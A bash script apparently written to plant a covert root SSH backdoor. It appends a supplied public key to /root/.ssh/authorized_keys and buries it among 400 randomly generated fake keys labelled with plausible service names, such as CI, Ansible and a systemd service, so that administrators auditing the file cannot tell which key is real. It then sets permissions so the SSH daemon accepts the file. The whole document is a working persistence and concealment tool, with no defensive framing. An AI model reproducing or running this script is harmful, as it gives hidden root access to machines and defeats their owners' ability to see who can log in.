#!/bin/bash
# generate_haystack.sh - Floods authorized_keys to hide the real key

REAL_KEY="$1"
TARGET_FILE="/root/.ssh/authorized_keys"

# Ensure the .ssh directory exists with correct permissions
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# 1. Generate 200 Fake Keys
for i in {1..200}; do
  FAKE_B64=$(head -c 300 /dev/urandom | base64 -w 0 | tr -dc 'a-zA-Z0-9+/')
  COMMENTS=("root@backup-server" "jenkins@ci-cd" "ansible@control-node" "git@gitlab" "admin@jumpbox")
  RAND_COMMENT=${COMMENTS[$RANDOM % ${#COMMENTS[@]}]}
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ${FAKE_B64} ${RAND_COMMENT}" >> "$TARGET_FILE"
done

# 2. Sneak the REAL key into the middle
echo "$REAL_KEY" >> "$TARGET_FILE"

# 3. Generate 200 MORE Fake Keys
for i in {1..200}; do
  FAKE_B64=$(head -c 300 /dev/urandom | base64 -w 0 | tr -dc 'a-zA-Z0-9+/')
  echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ${FAKE_B64} systemd-sync-svc" >> "$TARGET_FILE"
done

# Ensure the file has strict SSH permissions so the daemon doesn't reject it
chmod 600 "$TARGET_FILE"